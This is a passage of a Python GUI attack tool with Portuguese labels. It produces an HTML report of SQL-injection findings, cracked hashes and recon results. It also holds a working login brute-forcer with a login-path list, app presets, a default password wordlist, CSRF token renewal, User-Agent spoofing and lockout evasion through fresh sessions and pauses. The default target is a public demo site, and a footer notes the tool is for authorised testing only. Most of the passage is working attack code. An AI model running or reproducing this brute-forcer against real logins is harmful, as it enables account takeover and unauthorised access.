        filename = filedialog.asksaveasfilename(
            defaultextension=".html", filetypes=[("HTML", "*.html")]
        )
        if not filename:
            return

        rows = ""
        for (param, payload, status, elapsed, vuln, desc, detail, length, leaked) in self.results:
            color = "#3a0d0d" if vuln else "#0d3a12"
            badge = ('<b style="color:#ff7518">VULN</b>' if vuln
                     else '<b style="color:#3a86ff">OK</b>')
            leak = "".join(f"<li>{html.escape(x)}</li>" for x in leaked[:15])
            rows += f"""
            <tr style="background:{color};color:#00ff41">
              <td>{html.escape(param)}</td>
              <td><code>{html.escape(payload)}</code></td>
              <td>{html.escape(desc)}</td>
              <td>{status}</td>
              <td>{length}</td>
              <td>{elapsed:.1f}s</td>
              <td>{badge}</td>
              <td>{html.escape(detail or "-")}<ul>{leak}</ul></td>
            </tr>
            """

        findings = ""
        for i, (param, payload, desc, detail, test_url, leaked) in enumerate(self.findings, 1):
            data = "".join(f"<li>{html.escape(x)}</li>" for x in leaked[:20])
            findings += f"""
            <div class="card">
              <h3>Achado #{i}</h3>
              <p><b>Parâmetro:</b> {html.escape(param)}</p>
              <p><b>Técnica:</b> {html.escape(desc)}</p>
              <p><b>Payload:</b> <code>{html.escape(payload)}</code></p>
              <p><b>Evidência:</b> {html.escape(detail)}</p>
              <p><b>URL:</b> {html.escape(test_url)}</p>
              <ul>{data}</ul>
            </div>
            """

        hashes = ""
        for htype, h, ctx, source, cracked in self.hash_findings:
            # senha quebrada em laranja-abóbora no relatório
            crack = (f'<b style="color:#ff7518">Quebrado: {html.escape(cracked)}</b>'
                     if cracked else "Não quebrado")
            hashes += f"""
            <div class="card" style="border-left-color:#00ff41">
              <h3>{html.escape(htype)}</h3>
              <p><b>Hash:</b> <code>{html.escape(h)}</code></p>
              <p><b>Contexto:</b> {html.escape(ctx)}</p>
              <p><b>Origem:</b> {html.escape(source)}</p>
              <p>{crack}</p>
            </div>
            """

        recon = ""
        for entry, status, length, elapsed, target in sorted(self.recon_findings, key=lambda x: x[1]):
            recon += f"""
            <tr>
              <td><code>/{html.escape(entry)}</code></td>
              <td>{status}</td>
              <td>{length}</td>
              <td>{elapsed:.1f}s</td>
              <td><code>{html.escape(target)}</code></td>
            </tr>
            """

        doc = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>Relatório SQLi</title>
<style>
 body{{font-family:Consolas,monospace;background:#050805;color:#00ff41;padding:25px}}
 main{{max-width:1250px;margin:auto}}
 header{{background:#0b120b;border:1px solid #00ff41;padding:25px;border-radius:10px}}
 .stat{{display:inline-block;background:#0b120b;border:1px solid #00b32d;padding:18px;margin:10px 5px;border-radius:8px}}
 table{{width:100%;border-collapse:collapse;background:#0b120b}}
 th{{background:#003b00;color:#00ff41;padding:9px}}
 td{{padding:8px;border-bottom:1px solid #004d00;vertical-align:top}}
 code{{background:#001100;padding:3px;word-break:break-all}}
 .card{{background:#0b120b;margin:15px 0;padding:18px;border-left:5px solid #00ff41;border-radius:8px}}
 .pwd{{color:#ff7518;font-weight:bold}}
 footer{{margin-top:20px;color:#00b32d;font-size:12px}}
</style>
</head>
<body>
<main>
 <header>
  <h1>&#128737; Relatório de SQL Injection</h1>
  <p><b>Alvo:</b> {html.escape(self.url.get())}</p>
  <p>Gerado em: {datetime.now():%d/%m/%Y %H:%M}</p>
 </header>
 <div class="stat"><b>{len(self.findings)}</b><br>Achados SQLi</div>
 <div class="stat"><b>{len(self.results)}</b><br>Testes</div>
 <div class="stat"><b>{len(self.hash_findings)}</b><br>Hashes</div>
 <div class="stat"><b>{len(self.recon_findings)}</b><br>Recursos</div>

 <h2>&#128270; Evidências SQLi</h2>
 {findings or "<p>Nenhum achado confirmado.</p>"}

 <h2>&#128273; Hashes Encontrados</h2>
 {hashes or "<p>Nenhum hash encontrado.</p>"}

 <h2>&#128193; Recon (Wordlist)</h2>
 <table>
  <tr><th>Recurso</th><th>Status</th><th>Bytes</th><th>Tempo</th><th>URL</th></tr>
  {recon or "<tr><td colspan=5>Nenhum recurso encontrado.</td></tr>"}
 </table>

 <h2>&#128203; Todos os testes</h2>
 <table>
  <tr><th>Parâmetro</th><th>Payload</th><th>Técnica</th><th>Status</th>
      <th>Bytes</th><th>Tempo</th><th>Resultado</th><th>Evidência</th></tr>
  {rows}
 </table>

 <h2>&#128274; Recomendações</h2>
 <ul>
  <li>Use queries parametrizadas/prepared statements.</li>
  <li>Valide os tipos e formatos das entradas.</li>
  <li>Use princípio do menor privilégio no banco.</li>
  <li>Não exponha erros SQL ao usuário.</li>
  <li>Use hashes fortes com salt (bcrypt/argon2) e nunca MD5/SHA-1 para senhas.</li>
  <li>Use WAF como camada complementar, não como substituto.</li>
 </ul>
 <footer>SQLi Scanner — somente para testes autorizados</footer>
</main>
</body>
</html>"""

        try:
            with open(filename, "w", encoding="utf-8") as fh:
                fh.write(doc)
            self.write(f"[+] Relatório salvo: {filename}")
            webbrowser.open(filename)
        except OSError as e:
            self.write(f"[ERRO] Salvando relatório: {e}")


# ####################################################################
# ABA 3 — LOGIN BRUTE FORCE MULTI-ENDPOINT
# ####################################################################
LOCKOUT_PAUSA_SEGUNDOS = 300   # OrangeHRM: ~5 min | DVWA (impossible): 15 min
RETRY_PAUSA_SEGUNDOS = 10      # pausa padrão para HTTP 429

# ---------------------------------------------------------------- caminhos
CAMINHOS_LOGIN = [
    "/login.aspx",
    "/login.php",            # PHP simples (DVWA e muitos apps)
    "/auth/login.php",       # PHP com pasta /auth
    "/admin/login.php",
    "/admin/login",
    "/login",                # rotas modernas (Laravel, Express, Django)
    "/accounts/login",       # Django
    "/user/login",           # Drupal / apps comuns
    "/login.jsp",            # Java/JSP
    "/j_security_check",     # Java EE Form Auth
    "/login.action",         # Struts
    "/wp-login.php",         # WordPress
    "/wp-admin",             # WordPress
    "/signin",
    "/login.html",
    "/Account/Login",        # ASP.NET MVC
    "/setup.php",            # DVWA -> convertido para /login.php
    "/web/index.php/auth/login", # OrangeHRM 5
    "/auth/login",
    "/auth/signin",
    "/sign-in",
    "/logon",
    "/user/signin",
    "/users/login",
    "/member/login",
    "/members/login",
    "/account/login",
    "/accounts/login",
    "/customer/login",
    "/client/login",
    "/portal/login",
    "/dashboard/login",
    "/admin",
    "/admin/index.php",
    "/administrator",
    "/administrator/index.php",
    "/cpanel",
    "/controlpanel",
    "/backend/login",
    "/backend",
    "/web/login",
    "/web/index.php/login",
    "/index.php/login",
    "/index.php/auth/login",
    "/auth",
    "/login/index.php",
    "/user/auth/login",
    "/practice-test-login",      # Practice Test Automation
    "/practice-test-login/",     # idem (com barra final)
]

# Presets do modo manual (SPA / sem formulário clássico / campos extras)
PRESETS = {
    "OrangeHRM 5 (demo)": {
        "path": "/web/index.php/auth/login",
        "action": "/web/index.php/auth/validate",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "_token",
        "extra": "",
    },
    "DVWA": {
        "path": "/login.php",
        "action": "/login.php",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "user_token",
        "extra": "",
    },
    "WordPress": {
        "path": "/wp-login.php",
        "action": "/wp-login.php",
        "method": "post",
        "user": "log",
        "pass": "pwd",
        "token": "",
        "extra": "wp-submit=Log+In;redirect_to=%2Fwp-admin%2F;testcookie=1",
    },
    "Herokuapp (the-internet)": {
        "path": "/login",
        "action": "/authenticate",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "",
        "extra": "",
    },
    "SauceDemo (Swag Labs)": {
        "path": "/",
        "action": "/",
        "method": "post",
        "user": "user-name",
        "pass": "password",
        "token": "",
        "extra": "login-button=Login",
    },
    "Practice Test Automation": {
        "path": "/practice-test-login/",
        "action": "/practice-test-login/",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "",
        "extra": "",
    },
}

# URL termina em segmento com login/signin/auth/logon -> já é página de login
FIM_LOGIN_RE = re.compile(r"/([^/]*(?:login|signin|logon|auth)[^/]*)/?$", re.I)
PAGINA_SETUP_RE = re.compile(r"/setup\.php$", re.IGNORECASE)

USER_RE = re.compile(r"(user|username|login|email|account|j_username|usuario|mail|utilizador)", re.I)
TOKEN_RE = re.compile(r"(csrf|token|nonce|authenticity)", re.I)
PASS_RE = re.compile(r"(pass|senha|pwd)", re.I)

FALHA_RE = re.compile(
    r"(login failed|invalid (username|password|credentials?)|incorrect password|"
    r"wrong password|senha incorreta|credenciais inv[áa]lidas|"
    r"usu[áa]rio ou senha (inv[áa]lido|incorret)|autentica[çc][ãa]o falhou|"
    r"falha no login|access denied|login inv[áa]lido|"
    r"password.*(wrong|invalid|incorrect)|usu[áa]rio n[ãa]o encontrado|"
    r"(your )?(username|user name|password) is (invalid|incorrect)|"
    r"epic sadface|do not match any user|"
    r"account (is )?locked|maximum login attempts|"
    r"exceeded the maximum number of login attempts|"
    r"too many (failed )?login attempts|muitas tentativas|"
    r"invalid_csrf_token|csrf token validation failed)",
    re.IGNORECASE,
)
LOCKOUT_RE = re.compile(
    r"(account (is )?locked|locked out|maximum login attempts|"
    r"exceeded the maximum number of login attempts|"
    r"too many (failed )?login attempts|muitas tentativas|bloquead)",
    re.IGNORECASE,
)
SUCESSO_RE = re.compile(
    r"(dashboard|logout|log out|bem-vindo|welcome|congratulations|"
    r"logged in successfully)",
    re.IGNORECASE,
)


def montar_login_url(url):
    """Converte base ou página conhecida na URL exata do login."""
    url = (url or "").strip()
    url = re.sub(r"\?.*$", "", url)
    if not url:
        return ""
    if PAGINA_SETUP_RE.search(url):            # DVWA setup -> login.php
        return PAGINA_SETUP_RE.sub("/login.php", url)
    if "orangehrm" in url.lower() and "/web/index.php" not in url:
        return url.rstrip("/") + "/web/index.php/auth/login"
    if re.match(r"^https?://[^/]+$", url):     # só host -> raiz (/)
        return url + "/"
    if FIM_LOGIN_RE.search(url):               # já é página de login
        return url
    # URL já tem caminho (ex.: /practice-test-login) -> usa como está
    if "/" in url.split("://", 1)[-1]:
        return url
    return url + "/login.php"                  # assume padrão PHP


DEFAULT_WORDLIST = [
    "password", "admin", "admin123", "123456", "12345678", "dvwa", "letmein",
    "root", "toor", "test", "teste", "senha", "senha123", "qwerty", "abc123",
    "welcome", "monkey", "dragon", "master", "iloveyou", "batman", "p@ssw0rd",
    "Passw0rd!", "Password123", "administrator", "changeme", "1234", "12345", "default",
    "user", "usuario", "dvwa123", "secret", "security", "hacker", "admin123456",
    "SuperSecretPassword!", "password1", "password12", "password1234", "password2024",
    "password2025", "password2026", "admin1", "admin12", "admin1234", "admin12345",
    "administrator123", "guest", "guest123", "demo", "demo123", "testing", "login",
    "login123", "pass", "pass123", "passwd", "passwd123", "senha1234", "senha2024",
    "senha2025", "senha2026", "welcome1", "welcome123", "letmein123", "qwerty123",
    "qwertyuiop", "asdfgh", "asdf123", "zxcvbnm", "abcd1234", "master123", "football",
    "baseball", "soccer", "superman", "pokemon", "naruto", "internet", "computer",
    "windows", "linux", "ubuntu", "debian", "kali", "raspberry", "oracle", "mysql",
    "postgres", "mongodb", "docker", "kubernetes", "root123", "root1234", "adminadmin",
    "1234567", "123456789", "1234567890", "111111", "000000", "121212", "654321",
    "987654321", "1q2w3e4r", "1qaz2wsx", "zaq12wsx", "!@#$%^&*", "P@ssw0rd", "Welcome1",
    "Welcome123", "Admin123", "Admin@123", "Root@123", "Password@123", "Password123!",
    "Qwerty123!", "mutillidae", "owasp", "owaspbwa", "metasploitable", "trustno1",
    "welcomehome", "summer2024", "summer2025", "summer2026", "winter2024", "winter2025",
    "spring2025", "autumn2025", "administrator1", "sysadmin", "sysadmin123", "operator",
    "operator123", "support", "support123", "backup", "backup123", "service", "service123",
    "manager", "manager123", "company123", "office123", "network123", "server123",
    "localadmin", "local123", "temp123", "temp2025", "dev123", "developer",
    "developer123", "qa123", "staging123", "production", "production123",
]


def parse_campos_extras(texto):
    """Converte 'a=1;b=2,c=3' num dict. Retorna {} se vazio/inválido."""
    extras = {}
    if not texto:
        return extras
    for parte in re.split(r"[;,]", texto):
        parte = parte.strip()
        if not parte or "=" not in parte:
            continue
        nome, _, valor = parte.partition("=")
        extras[nome.strip()] = valor.strip()
    return extras


class BruteForceLogin:
    def __init__(self, login_url, username, passwords, log, progress, stop_event,
                 result_callback, verbose=True, renovar_token=True, delay=0.0,
                 inicio=0, manual=None):      # manual = dict do modo manual (SPA)
        self.login_url = montar_login_url(login_url)
        self.username = username
        self.passwords = passwords
        self.log = log
        self.progress = progress
        self.stop = stop_event
        self.result_callback = result_callback
        self.verbose = verbose
        self.renovar_token = renovar_token
        self.delay = delay
        self.inicio = inicio
        self.manual = manual or {}
        self.spa = False                 # True para SPA/JS -> heurísticas conservadoras
        self.session = requests.Session()
        self._config_headers()
        self.found = False
        self._ultimo_texto = ""

    def _config_headers(self):
        self.session.headers.update({"User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                           "AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/126.0 Safari/537.36"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
        })

    def _sleep_interruptivel(self, segundos):
        """Sleep que respeita o botão Parar. Retorna False se interrompido."""
        fim = time.time() + segundos
        while time.time() < fim:
            if self.stop.is_set():
                return False
            time.sleep(min(0.2, fim - time.time()))
        return True

    # ---------------------------------------------------------- helpers
    def _get_pagina_login(self):
        try:
            r = self.session.get(self.login_url, verify=False, timeout=10)
        except requests.exceptions.RequestException as e:
            self.log(f"[!] Erro ao obter a página de login: {e}")
            return None
        if r.status_code == 404:
            self.log("[!] HTTP 404: página de login não encontrada neste caminho.")
            self.log("[i] Use o menu 'Caminho comum' (ex.: /auth/login.php, /login.jsp).")
            return None
        if r.status_code in (401, 403):
            self.log(f"[!] HTTP {r.status_code}: página protegida (Basic Auth?) — "
                     f"este script não cobre autenticação HTTP básica.")
            return None
        return r

    def _parse_form(self, html_text, page_url):
        if BeautifulSoup is None:
            self.log("[!] beautifulsoup4 não instalado. Execute: pip install beautifulsoup4")
            return None
        soup = BeautifulSoup(html_text, "html.parser")
        form = None
        for f in soup.find_all("form"):
            if f.find("input", {"type": "password"}):
                form = f
                break
        if form is None:
            return None

        action_url = urljoin(page_url, form.get("action") or page_url)
        method = (form.get("method") or "post").lower()
        campos, submit = {}, {}
        user_field = pass_field = None
        inputs = form.find_all("input")

        for inp in inputs:
            nome = inp.get("name")
            if not nome:
                continue
            tipo = (inp.get("type") or "text").lower()
            valor = inp.get("value") or ""
            if tipo == "password":
                if pass_field is None:
                    pass_field = nome
                campos[nome] = ""
            elif tipo in ("submit", "button", "image"):
                submit[nome] = valor
            elif tipo in ("text", "hidden", "email", "tel", "number", "search", "url"):
                campos[nome] = valor

        # <button type="submit"> (ex.: practice-test-login usa <button id="submit">)
        for btn in form.find_all("button"):
            if (btn.get("type") or "submit").lower() in ("submit", "button"):
                nome = btn.get("name")
                if nome and nome not in submit:
                    submit[nome] = btn.get("value") or ""

        for sel in form.find_all("select"):
            nome = sel.get("name")
            if nome and nome not in campos:
                opcao = sel.find("option", selected=True) or sel.find("option")
                campos[nome] = opcao.get("value", "") if opcao else ""

        for ta in form.find_all("textarea"):
            nome = ta.get("name")
            if nome and nome not in campos:
                campos[nome] = ta.get_text()

        if pass_field is None:                 # nome com 'pass' sem type=password
            for inp in inputs:
                nome = inp.get("name") or ""
                if PASS_RE.search(nome):
                    pass_field = nome
                    campos.setdefault(nome, "")
                    break
        if pass_field is None:
            return None

        for inp in inputs:                     # campo de usuário sugestivo
            nome = inp.get("name") or ""
            tipo = (inp.get("type") or "text").lower()
            if tipo in ("text", "email", "tel", "number", "search") and USER_RE.search(nome):
                user_field = nome
                break
        if user_field is None:                 # senão: 1º campo de texto
            for inp in inputs:
                nome = inp.get("name") or ""
                tipo = (inp.get("type") or "text").lower()
                if (tipo in ("text", "email", "tel", "number", "search") and nome
                        and nome != pass_field and not TOKEN_RE.search(nome)):
                    user_field = nome
                    break
        if user_field is None:
            return None

        token_field = token_val = None         # token CSRF
        for inp in inputs:
            nome = inp.get("name") or ""
            tipo = (inp.get("type") or "text").lower()
            if tipo == "hidden" and TOKEN_RE.search(nome):
                token_field = nome
                token_val = inp.get("value") or ""
                break

        return (action_url, method, campos, submit,
                user_field, pass_field, token_field, token_val)

    def _extrair_token(self, texto):
        """Extrai token CSRF de várias fontes (input, meta, atributo Vue, etc.)."""
        if not texto or BeautifulSoup is None:
            return None
        # 1) inputs com nome sugestivo (qualquer tipo, preferindo hidden)
        soup = BeautifulSoup(texto, "html.parser")
        for inp in soup.find_all("input"):
            nome = inp.get("name") or ""
            if TOKEN_RE.search(nome):
                valor = inp.get("value")
                if valor:
                    return html.unescape(valor)
        # 2) meta tags (ex.: name="csrf-token")
        for meta in soup.find_all("meta"):
            nome = meta.get("name") or ""
            if TOKEN_RE.search(nome):
                valor = meta.get("content")
                if valor:
                    return html.unescape(valor)
        # 3) OrangeHRM 5: <auth-login :token="&quot;...&quot;">
        m = re.search(r"<auth-login[^>]*:token\s*=\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            valor = html.unescape(m.group(1))
            if len(valor) >= 2 and valor[0] == valor[-1] == '"':
                valor = valor[1:-1]
            return valor
        # 4) atributos data-* e JSON "csrfToken":"..."
        m = re.search(r"data-(?:csrf-?token|token)\s*=\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            return html.unescape(m.group(1))
        m = re.search(r"[\"']csrfToken[\"']\s*:\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            return html.unescape(m.group(1))
        return None

    def _tem_campo_senha(self, texto):
        return bool(texto) and re.search(
            r"type\s*=\s*['\"]password['\"]", texto, re.I) is not None

    def _detectar_conhecido(self, texto, url):
        """Detecta sites conhecidos sem formulário clássico (fallback)."""
        amostra = (url or "") + " " + (texto or "")[:4000]
        if re.search(r"orangehrm|auth-login", amostra, re.I):
            return {
                "nome": "OrangeHRM 5",
                "action": "/web/index.php/auth/validate",
                "method": "post",
                "user_field": "username",
                "pass_field": "password",
                "token_field": "_token",
                "extra": {},
            }
        if re.search(r"practice-test-login", amostra, re.I):
            return {
                "nome": "Practice Test Automation",
                "action": "/practice-test-login/",
                "method": "post",
                "user_field": "username",
                "pass_field": "password",
                "token_field": None,
                "extra": {},
            }
        return None

    def _montar_form_manual(self, page_url, texto):
        """Monta o 'formulário' a partir da configuração manual (SPA/extras)."""
        action = (self.manual.get("action") or "").strip()
        method = (self.manual.get("method") or "post").lower()
        user_field = (self.manual.get("user_field") or "").strip()
        pass_field = (self.manual.get("pass_field") or "").strip()
        token_field = (self.manual.get("token_field") or "").strip() or None
        if not (action and user_field and pass_field):
            self.log("[!] Modo manual incompleto: action, campo usuário e "
                     "campo senha são obrigatórios.")
            return None
        action_url = urljoin(page_url, action)
        campos = dict(self.manual.get("extra") or {})   # campos extras (fixos)
        token_val = self._extrair_token(texto) if token_field else None
        return (action_url, method, campos, {}, user_field, pass_field,
                token_field, token_val)

    def _obter_formulario(self, pagina):
        if self.manual:
            return self._montar_form_manual(pagina.url, pagina.text)
        return self._parse_form(pagina.text, pagina.url)

    # ---------------------------------------------------------- ataque
    def _tentar(self, senha, campos, submit, token_field, token_val,
                action_url, method, user_field, pass_field):
        data = dict(campos)
        data[user_field] = self.username
        data[pass_field] = senha
        if submit:
            data.update(submit)
        if token_field and token_val:
            data[token_field] = token_val

        try:
            if method == "get":
                r = self.session.get(action_url, params=data,
                                     headers={"Referer": self.login_url},
                                     verify=False, timeout=10, allow_redirects=False)
            else:
                r = self.session.post(action_url, data=data,
                                      headers={"Referer": self.login_url},
                                      verify=False, timeout=10, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            self.log(f"[!] Erro na tentativa: {e}")
            return None

        self._ultimo_texto = r.text or ""

        if r.status_code == 429:               # rate limit
            retry = r.headers.get("Retry-After", "")
            pausa = int(retry) if retry.strip().isdigit() else RETRY_PAUSA_SEGUNDOS
            self.log(f"[!] HTTP 429 (rate limit). Aguardando {pausa}s...")
            self._sleep_interruptivel(pausa)
            return None

        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            if re.search(r"(login|logon|signin|auth|error|failed|denied)", loc, re.I):
                return False
            return True

        if r.status_code in (401, 403):
            return False

        ct = r.headers.get("Content-Type", "")
        if "json" in ct.lower():               # APIs JSON
            if re.search(r'"success"\s*:\s*true|"token"\s*:|"authenticated"\s*:\s*true|'
                         r'"status"\s*:\s*"(ok|success)"', r.text, re.I):
                return True
            return False

        if LOCKOUT_RE.search(r.text) or FALHA_RE.search(r.text):
            return False

        if SUCESSO_RE.search(r.text):
            return True

        if self.spa:
            # SPA/modo manual: ausência de type=password NÃO indica sucesso
            # (formulário pode ser renderizado via JS). Resposta conservadora.
            return False

        if not self._tem_campo_senha(r.text):  # página pós-login
            return True
        return False                           # formulário ainda presente

    def run(self):
        total = len(self.passwords)
        retomando = self.inicio > 0

        if retomando:
            # retomada: NÃO repete o banner, apenas indica o ponto
            self.log(f"\n[*] Retomando da senha: {self.inicio + 1} "
                     f"({self.passwords[self.inicio]}) — "
                     f"{total - self.inicio} restantes")
            self.log("")
        else:
            self.log(f"\n[*] Alvo    : {self.login_url}")
            self.log(f"\n[*] Usuário : {self.username} | Senhas a testar: {total}")
            self.log("")

        pagina = self._get_pagina_login()
        if pagina is None:
            return
        if not retomando:
            self.log(f"[*] Página de login obtida (HTTP {pagina.status_code}, "
                     f"{len(pagina.text)} bytes)")

        if "setup.php" in pagina.url.lower():
            self.log("")
            self.log("[!] DVWA redirecionou para setup.php -> banco de dados NÃO criado.")
            self.log(f"[!] Acesse {pagina.url.split('?')[0]} e clique em "
                     f"'Create / Reset Database'.")
            return

        # ---------------------------------------------------- formulário
        form = None
        if not self.manual:
            form = self._parse_form(pagina.text, pagina.url)
            if form is None:
                auto = self._detectar_conhecido(pagina.text, self.login_url)
                if auto is None:
                    self.log("")
                    self.log("[!] Nenhum formulário de login encontrado (campo type=password ausente).")
                    self.log("[i] A página pode ser renderizada via JavaScript (SPA/React/Vue).")
                    self.log("[i] 1) Confirme a URL correta (ex.: /web/index.php/auth/login no OrangeHRM).")
                    self.log("[i] 2) Ou ative o painel 'Modo manual (SPA ou campos customizados)'")
                    self.log("[i]    e escolha um preset, informando action, campos e token.")
                    return
                self.log("")
                self.log(f"[+] Site conhecido detectado ({auto.get('nome', 'aplicação')}) — "
                         f"usando configuração automática\n")
                self.manual = auto
                self.spa = True
                form = self._obter_formulario(pagina)
        else:
            self.spa = True
            form = self._obter_formulario(pagina)

        if form is None:
            self.log("[!] Não foi possível montar o formulário. Abortando.")
            return

        (action_url, method, campos, submit,
         user_field, pass_field, token_field, token_val) = form

        if not retomando:
            self.log(f"\n[*] Formulário : action={action_url} | method={method.upper()}")
            self.log(f"\n[*] Campo user : '{user_field}' | campo senha: '{pass_field}'\n")
            if campos:
                self.log(f"[*] Campos extras: {campos}\n")
            if submit:
                self.log(f"[*] Botão submit: {submit}")
            if token_field:
                self.log(f"\n[+] Token CSRF : '{token_field}' -> renovado a cada tentativa")
            else:
                self.log("\n[i] Token CSRF : não detectado -> atacando direto")
            self.log("")

        for idx in range(self.inicio, total):
            if self.stop.is_set():
                self.log("\n[*] Ataque interrompido pelo usuário. Clique em "
                         ">> Iniciar Ataque << para continuar de onde parou.")
                return
            if self.found:
                return
            i = idx + 1
            pwd = self.passwords[idx].strip()
            if not pwd:
                continue

            if self.verbose:
                self.log(f"[{i}/{total}] Testando:   {pwd}")
            self.progress(i, total, pwd)

            res = self._tentar(pwd, campos, submit, token_field, token_val,
                               action_url, method, user_field, pass_field)

            if res is None:                    # erro de rede / rate limit
                if not self._sleep_interruptivel(2):
                    return
                continue

            if res:
                self.found = True
                self.log("")
                self.log("=" * 55)
                self.log(f"\n[+] SENHA ENCONTRADA: {pwd}")
                self.log(f"\n[+] Credenciais \n\nUSUARIO: {self.username}   \n\nSENHA: {pwd}\n")
                self.log("=" * 55)
                # SEM salvamento automático: senha fica p/ o botão "Salvar Senha"
                self.result_callback(self.username, pwd)
                return

            if LOCKOUT_RE.search(self._ultimo_texto):   # lockout
                self.log(f"[!] Lockout detectado. Nova sessão + pausa de "
                         f"{LOCKOUT_PAUSA_SEGUNDOS}s...")
                self.session = requests.Session()
                self._config_headers()
                if not self._sleep_interruptivel(LOCKOUT_PAUSA_SEGUNDOS):
                    self.log("[*] Pausa interrompida pelo usuário.")
                    return
                pagina2 = self._get_pagina_login()
                if pagina2 is None:
                    return
                form2 = self._obter_formulario(pagina2)
                if form2 is None:
                    self.log("[!] Formulário não encontrado após lockout. Abortando.")
                    return
                (action_url, method, campos, submit,
                 user_field, pass_field, token_field, token_val) = form2
                continue

            if token_field and self.renovar_token:       # renova token CSRF
                token_val = self._extrair_token(self._ultimo_texto)
                if token_val is None:
                    if not self._sleep_interruptivel(1):
                        return
                    r2 = self._get_pagina_login()
                    token_val = self._extrair_token(r2.text) if r2 else None
                if token_val is None:
                    self.log("[!] Token não renovado; pausa de 3s...")
                    if not self._sleep_interruptivel(3):
                        return
                    r2 = self._get_pagina_login()
                    token_val = self._extrair_token(r2.text) if r2 else None
                if token_val is None:
                    self.log("[!] Abortando: servidor parou de fornecer token CSRF.")
                    return

            if self.delay > 0:
                if not self._sleep_interruptivel(self.delay):
                    return

        if not self.found:
            self.log(f"[-] Nenhuma senha válida encontrada em {total} tentativas.")


class LoginTab(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent, padding=8)
        self.stop_event = threading.Event()
        self.worker = None
        self.queue = queue.Queue()
        self.senha_encontrada = None
        self.proximo_indice = 0     # índice 0-based da PRÓXIMA senha a testar (retomada)
        self.fonte_wordlist = ""    # wordlist usada na última execução
        self.parado_pelo_usuario = False  # True somente quando o usuário clicou em Parar
        self._build_ui()
        self._poll_queue()

    # ------------------------------------------------------- construção UI
    def _build_ui(self):
        frm = ttk.LabelFrame(self, text="Configuração do Alvo", padding=5)
        frm.pack(fill="x", padx=4, pady=6)

        ttk.Label(frm, text="URL (base ou página de login):").grid(
            row=0, column=0, sticky="w", padx=5, pady=4)
        self.url_var = tk.StringVar(
            value="https://opensource-demo.orangehrmlive.com/web/index.php/auth/login")
        ttk.Entry(frm, textvariable=self.url_var, width=48).grid(
            row=0, column=1, sticky="we", padx=5, pady=4)

        ttk.Label(frm, text="Caminho comum:").grid(
            row=1, column=0, sticky="w", padx=5, pady=4)
        self.path_var = tk.StringVar()
        self.path_combo = ttk.Combobox(frm, textvariable=self.path_var,
                                       values=CAMINHOS_LOGIN, state="readonly", width=46)
        self.path_combo.grid(row=1, column=1, sticky="we", padx=5, pady=4)
        self.path_combo.bind("<<ComboboxSelected>>", self.aplicar_caminho)

        ttk.Label(frm, text="Usuário:").grid(
            row=2, column=0, sticky="w", padx=5, pady=4)
        self.user_var = tk.StringVar(value="Admin")
        ttk.Entry(frm, textvariable=self.user_var, width=48).grid(
            row=2, column=1, sticky="we", padx=5, pady=4)

        ttk.Label(frm, text="Wordlist (senhas):", style="Orange.TLabel").grid(
            row=3, column=0, sticky="w", padx=5, pady=4)
        self.wordlist_var = tk.StringVar(value="")
        ttk.Entry(frm, textvariable=self.wordlist_var, width=48).grid(
            row=3, column=1, sticky="we", padx=5, pady=4)
        ttk.Button(frm, text="Procurar...", command=self.browse).grid(
            row=3, column=2, padx=5, pady=4)

        opts = ttk.Frame(frm)
        opts.grid(row=4, column=1, sticky="w", padx=5, pady=4)
        self.verbose_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opts, text="Mostrar cada tentativa",
                        variable=self.verbose_var).pack(side="left", padx=4)
        self.token_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opts, text="Renovar token CSRF",
                        variable=self.token_var).pack(side="left", padx=4)
        ttk.Label(opts, text="Delay (s):").pack(side="left", padx=(8, 2))
        self.delay_var = tk.DoubleVar(value=0.0)
        ttk.Spinbox(opts, from_=0.0, to=10.0, increment=0.5,
                    textvariable=self.delay_var, width=5).pack(side="left")
        frm.columnconfigure(1, weight=1)

        # --------------------------------------- modo manual (SPA/extras)
        frm_man = ttk.LabelFrame(
            self, text="Modo manual (SPA ou campos customizados) — ignorado se não ativado",
            padding=5)
        frm_man.pack(fill="x", padx=4, pady=4)

        linha0 = ttk.Frame(frm_man)
        linha0.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha0, text="Preset:").pack(side="left")
        self.preset_var = tk.StringVar()
        self.preset_combo = ttk.Combobox(linha0, textvariable=self.preset_var,
                                         values=list(PRESETS.keys()),
                                         state="readonly", width=30)
        self.preset_combo.pack(side="left", padx=4)
        self.preset_combo.bind("<<ComboboxSelected>>", self.aplicar_preset)
        self.manual_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(linha0, text="Ativar modo manual",
                        variable=self.manual_var).pack(side="left", padx=8)
        ttk.Label(linha0, text="(ignora a detecção automática)").pack(side="left")

        linha1 = ttk.Frame(frm_man)
        linha1.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha1, text="Action:").pack(side="left")
        self.man_action_var = tk.StringVar()
        ttk.Entry(linha1, textvariable=self.man_action_var, width=52).pack(side="left", padx=4)
        ttk.Label(linha1, text="Método:").pack(side="left")
        self.man_method_var = tk.StringVar(value="POST")
        ttk.Combobox(linha1, textvariable=self.man_method_var, values=["POST", "GET"],
                     state="readonly", width=6).pack(side="left")

        linha2 = ttk.Frame(frm_man)
        linha2.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha2, text="Campo usuário:").pack(side="left")
        self.man_user_var = tk.StringVar(value="username")
        ttk.Entry(linha2, textvariable=self.man_user_var, width=14).pack(side="left", padx=4)
        ttk.Label(linha2, text="Campo senha:").pack(side="left")
        self.man_pass_var = tk.StringVar(value="password")
